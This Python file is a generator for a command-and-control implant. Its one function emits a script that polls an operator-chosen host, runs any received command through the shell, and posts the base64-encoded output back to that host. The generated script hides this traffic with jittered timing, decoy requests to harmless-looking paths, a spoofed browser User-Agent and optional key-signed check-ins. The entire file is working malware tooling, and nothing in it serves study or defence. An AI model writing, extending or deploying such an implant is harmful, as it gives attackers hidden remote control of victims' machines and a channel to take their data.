#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Self-contained HTTP polling agent script builder."""

from __future__ import annotations

from typing import Iterable, List, Optional


def build_http_polling_agent_script(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    poll_interval: float = 10.0,
    jitter_percent: float = 35.0,
    cover_traffic: bool = True,
    decoy_paths: Optional[Iterable[str]] = None,
    use_ssl: bool = False,
    private_key_pem: Optional[str] = None,
) -> str:
    """Return Python source for an HTTP polling implant."""
    scheme = "https" if use_ssl else "http"
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    decoys: List[str] = list(decoy_paths or ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status"])
    decoys_lit = repr(decoys)
    host_lit = repr(str(host))
    port_lit = int(port)
    cid_lit = repr(str(client_id))
    poll_lit = float(poll_interval)
    jitter_lit = float(jitter_percent)
    cover_lit = bool(cover_traffic)
    prefix_lit = repr(prefix)

    identity_block = ""
    sig_helper = ""
    if private_key_pem:
        from lib.implant.identity import embedded_private_key_block

        pem_lit = embedded_private_key_block(private_key_pem)
        sig_helper = (
            "from cryptography.hazmat.primitives import serialization\n"
            "import base64\n"
            f"_pem={pem_lit}\n"
            "_pk=serialization.load_pem_private_key(_pem.encode(),password=None)\n"
            "def _sig(cid):\n"
            " s=_pk.sign(str(cid).encode())\n"
            " return base64.urlsafe_b64encode(s).decode().rstrip('=')\n"
        )

    return (
        "import base64,json,os,random,subprocess,time,urllib.parse,urllib.request\n"
        + sig_helper
        + f"HOST={host_lit};PORT={port_lit};CID={cid_lit};PREFIX={prefix_lit}\n"
        + f"POLL={poll_lit};JIT={jitter_lit};COVER={cover_lit};DECOYS={decoys_lit}\n"
        + f"BASE='{scheme}://'+HOST+(':'+str(PORT) if PORT not in (80,443) else '')\n"
        + "def _qs():\n"
        + " q={'id':CID}\n"
        + " try: q['sig']=_sig(CID)\n"
        + " except: pass\n"
        + " return urllib.parse.urlencode(q)\n"
        + "def _sleep(h):\n"
        + " b=max(0.5,POLL);j=max(0.0,min(100.0,JIT))/100.0\n"
        + " d=float(h) if h and float(h)>0 else b\n"
        + " time.sleep(max(0.5,d+d*random.uniform(-j,j)))\n"
        + "def _req(method,path,body=None,headers=None):\n"
        + " u=BASE+path;hd=dict(headers or {})\n"
        + " r=urllib.request.Request(u,data=body,method=method,headers=hd)\n"
        + " with urllib.request.urlopen(r,timeout=30) as resp: return resp.read()\n"
        + "def _decoy():\n"
        + " if not COVER: return\n"
        + " try:\n"
        + "  p=random.choice(DECOYS); _req('GET',p,headers={'User-Agent':'Mozilla/5.0'})\n"
        + " except: pass\n"
        + "while True:\n"
        + " try:\n"
        + "  if COVER and random.random()<0.35: _decoy()\n"
        + "  q=_qs()\n"
        + "  raw=_req('GET',PREFIX+'/poll?'+q,headers={'User-Agent':'Mozilla/5.0'})\n"
        + "  data=json.loads(raw.decode('utf-8','replace') or '{}')\n"
        + "  cmd=''\n"
        + "  if data.get('command'):\n"
        + "   cmd=base64.b64decode(data['command']).decode('utf-8','replace') if data.get('encoding')=='base64' else str(data['command'])\n"
        + "  out=''\n"
        + "  if cmd.strip():\n"
        + "   try:\n"
        + "    p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)\n"
        + "    out=(p.stdout or '')+(p.stderr or '')\n"
        + "    if not out.strip(): out='[exit %s]'%p.returncode\n"
        + "   except Exception as e: out='ERROR:%s'%e\n"
        + "   body=json.dumps({'output':base64.b64encode(out.encode()).decode(),'encoding':'base64','id':CID}).encode()\n"
        + "   _req('POST',PREFIX+'/result?'+q,body=body,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'})\n"
        + "  _sleep(data.get('next_sleep'))\n"
        + " except Exception:\n"
        + "  _sleep(None)\n"
    )
